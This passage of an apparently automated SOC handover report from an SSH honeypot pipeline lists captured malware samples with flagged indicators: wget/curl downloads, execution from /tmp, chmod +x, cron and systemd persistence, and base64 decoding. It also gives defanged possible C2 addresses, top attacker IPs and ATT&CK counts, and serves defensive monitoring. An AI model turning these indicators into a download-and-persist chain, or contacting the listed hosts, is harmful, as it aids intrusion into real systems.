| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `65.181.71[.]117` | HK | PCCW IMS Ltd (PCCW Business Internet Access) | **100** ⚠️ | 21 |
| `152.89.12[.]101` | IR | Sharif University Of Technology | **100** ⚠️ | 50 |
| `168.205.176[.]199` | BR | Osirnet Info Telecom Ltda. | **100** ⚠️ | 1 |
| `14.103.118[.]186` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `190.54.165[.]211` | CL | Telmex Servicios Empresariales S.A. | **100** ⚠️ | 5 |
| `116.55.245[.]26` | CN | CHINANET YUNNAN PROVINCE NETWORK | **100** ⚠️ | 50 |
| `35.241.214[.]195` | BE | Google LLC | **100** ⚠️ | 5 |
| `37.57.198[.]172` | UA | CONTENT DELIVERY NETWORK LTD | **100** ⚠️ | 2 |
| `130.12.180[.]32` | DE | Virtualine Technologies | **100** ⚠️ | 46 |
| `45.121.25[.]115` | VN | Mobifone Corporation | **100** ⚠️ | 43 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 204 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 162 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 51 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 50 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 11 |

---

## 🔕 False Positive Summary (44 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 25 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 16 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 328 cases |
| Tool 34  | Credential Extractor        | ✅ 2654 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 29 fingerprints |
| Tool 36  | Command Clustering          | ✅ 19 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 211 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 44 filtered (13.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 95 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 34 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 159 priority case(s) shown individually · 118 recon entry/entries in table (7 group(s) consolidating 14 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-10-16T15:47:05Z_
